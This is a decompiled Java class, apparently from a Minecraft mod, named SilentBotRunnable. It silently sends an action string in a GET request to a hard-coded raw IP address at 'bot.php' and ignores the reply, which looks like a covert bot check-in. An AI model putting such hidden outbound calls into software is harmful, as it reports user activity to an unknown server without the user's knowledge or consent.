//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "/home/f-00/MCP-919"!

//Decompiled by Procyon!

package me.omi.thread;

import java.net.*;
import java.io.*;

public class SilentBotRunnable implements Runnable
{
    String toDo;
    
    public SilentBotRunnable(final String action) {
        this.toDo = action;
    }
    
    @Override
    public void run() {
        try {
            final URL url = new URL("http://178.238.8.84/bot.php?set=" + this.toDo);
            final HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestProperty("accept", "application/json");
            final InputStream responseStream = connection.getInputStream();
            final BufferedReader rd = new BufferedReader(new InputStreamReader(responseStream));
            final StringBuilder response = new StringBuilder();
            String line;
            while ((line = rd.readLine()) != null) {
                response.append(line);
            }
            rd.close();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
